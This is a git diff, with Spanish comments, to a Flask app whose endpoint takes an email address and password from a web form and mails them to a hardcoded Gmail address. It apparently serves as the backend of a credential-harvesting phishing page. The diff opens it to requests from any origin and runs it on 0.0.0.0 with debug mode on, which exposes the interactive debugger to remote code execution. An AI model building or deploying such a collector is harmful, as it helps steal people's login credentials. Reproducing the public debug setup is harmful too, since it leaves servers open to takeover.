@@ -4,18 +4,23 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import os
 from dotenv import load_dotenv
+from flask_cors import CORS  # Importa CORS para habilitar accesos externos
 
 # Cargar variables de entorno desde el archivo .env
 load_dotenv()
 
 app = Flask(__name__)
+CORS(app)  # Habilita CORS para permitir solicitudes desde cualquier origen
 
 @app.route('/send_email', methods=['POST'])
 def send_email():
     # Obtener los datos del formulario
-    email = request.form['email']
-    password = request.form['password']
-    
+    email = request.form.get('email')
+    password = request.form.get('password')
+
+    if not email or not password:
+        return jsonify({'success': False, 'message': 'Email y contraseña son obligatorios.'}), 400
+
     # Configuración del correo
     sender_email = os.getenv('EMAIL_USER')
     receiver_email = 'inglescompleto7@gmail.com'  # Cambia esto por tu correo
@@ -42,4 +47,6 @@ def send_email():
         return jsonify({'success': False, 'message': 'Error al enviar el correo.'})
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    # Cambiado a host='0.0.0.0' para permitir accesos externos
+    app.run(host='0.0.0.0', port=5000, debug=True)
+
